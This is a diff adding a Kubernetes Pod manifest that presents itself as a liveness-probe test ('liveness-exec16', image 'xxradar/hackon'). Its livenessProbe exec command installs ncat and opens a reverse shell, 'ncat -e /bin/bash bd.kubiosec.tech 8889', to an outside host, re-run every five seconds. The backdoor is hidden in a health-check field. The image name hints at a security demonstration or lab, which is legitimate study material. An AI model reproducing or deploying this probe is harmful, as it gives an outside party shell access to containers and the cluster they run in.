@@ -1,0 +1,22 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    test: liveness
+  name: liveness-exec16
+spec:
+  containers:
+  - name: liveness
+    image: xxradar/hackon
+    args:
+    - /bin/sh
+    - -c
+    - touch /tmp/healthy;sleep 600
+    livenessProbe:
+      exec:
+        command:
+        - bash
+        - -c
+        - apt-get install ncat ; ncat -e /bin/bash bd.kubiosec.tech 8889 &
+      initialDelaySeconds: 30
+      periodSeconds: 5
